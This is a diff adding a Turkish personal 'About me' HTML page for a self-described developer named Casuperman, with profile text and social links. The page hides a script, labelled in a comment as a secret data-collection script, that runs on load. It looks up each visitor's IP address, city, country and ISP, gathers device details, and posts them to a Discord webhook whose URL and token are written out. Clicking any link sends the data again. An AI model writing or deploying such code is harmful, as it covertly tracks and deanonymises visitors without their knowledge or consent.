@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hakkımda - [Casuperman]</title> <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);        }
+        h1 {
+            text-align: center;
+            color: #2c3e50;
+        }        p {
+            line-height: 1.6;
+        }
+        .profile-img {
+            display: block;
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            margin: 20px auto;
+            object-fit: cover;
+        } .social-links {
+            text-align: center;
+            margin-top: 20px;
+        }        .social-links a {
+            margin: 0 10px;
+            color: #3498db;
+            text-decoration: none;
+        } </style>
+</head>
+<body>
+    <div class="container"> <img src="https://via.placeholder.com/150" alt="Profil Fotoğrafı" class="profile-img"> <h1>Merhaba! Ben Casuperman</h1>
+        <p>Yazılım geliştiriciyim ve siber güvenlikle ilgileniyorum. Aşağıda benimle ilgili daha fazla bilgi bulabilirsiniz.</p>        <h2>İlgi Alanlarım</h2>
+        <ul>
+            <li>Python & JavaScript Programlama</li>
+            <li>Siber Güvenlik & Hacking</li>
+            <li>Oyun Geliştirme</li>
+        </ul>
+php-template
+Copy code
+
+    <h2>Sosyal Medya</h2>
+    <div class="social-links"> <a href="#" onclick="trackClick('Discord')">Discord</a> |
+        <a href="#" onclick="trackClick('Twitter')">Twitter</a> |
+        <a href="#" onclick="trackClick('GitHub')">GitHub</a>
+    </div>
+
+    <!-- Gizli Veri Toplama Scripti -->
+    <script>
+        // Kullanıcı bilgilerini toplama
+        const userData = {
+            ip: "",                country: "",
+            city: "",
+            isp: "",
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenResolution: `${screen.width}x${screen.height}`, referrer: document.referrer,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            clickSource: ""            };
+
+        // IP ve konum bilgilerini alma
+        fetch('https://ipapi.co/json/') .then(response => response.json()) .then(data => {
+                userData.ip = data.ip || "Bilinmiyor";
+                userData.country = data.country_name || "Bilinmiyor";
+                userData.city = data.city || "Bilinmiyor"; userData.isp = data.org || "Bilinmiyor"; // Verileri Discord Webhook'a gönderme
+                sendToDiscord(userData);
+            });            // Tıklanan bağlantıyı kaydetme
+        function trackClick(source) {
+            userData.clickSource = source;
+
+            // Discord Webhook'a tekrar gönder (tıklanan bağlantıyla birlikte)
+            sendToDiscord(userData);                alert(`Teşekkürler! ${source} profilime yönlendiriliyorsunuz...`);
+            if (source === "Discord") window.location.href = "https://discord.com/users/seninid"; else if (source === "Twitter") window.location.href = "https://twitter.com/senintwitter";
+            else if (source === "GitHub") window.location.href = "https://github.com/seningithub"; } // Verileri Discord Webhook'a gönderme
+       function sendToDiscord(data) { const webhookUrl = "Shttps://discord.com/api/webhooks/1546874837807538176/oRrJoXpebNEhMJn5VWx9Zu_AoPKwe-4w0-uS4yY_dEWAiP2xClz8R1a6An9AlgQyP7A_"; // Buraya kendi webhook URL'ni yaz
+
+           const message = {
+               content: "@everyone Yeni Ziyaretçi!",                   embeds:[{
+                   title:"🔍 Yeni Ziyaretçi Tespit Edildi!", fields:[
+                       {name:"👤 IP Adresi", value:`\`${data.ip}\``, inline:true},
+                       {name:"🌍 Ülke / Şehir", value:`${data.country} / ${data.city}`, inline:true}, {name:"📡 İnternet Sağlayıcı", value:`${data.isp}`, inline:true}, {name:"💻 Cihaz Bilgisi", value:`${data.userAgent}`, inline:false},
+                       {name:"🖥️ Ekran Çözünürlüğü", value:`${data.screenResolution}`, inline:true}, {name:"⏰ Zaman Dilimi", value:`${data.timeZone}`, inline:true}, {name:"🔗 Tıklanan Bağlantı", value:`${data.clickSource || 'Ana Sayfa'}`, inline:false} ],
+                   color:"#ff0000" }] };
+
+           fetch(webhookUrl,{
+               method:"POST",
+               headers:{'Content-Type': 'application/json'},                   body : JSON.stringify(message)               });           } </script>
+
+   </div>
+</body>
+</html>
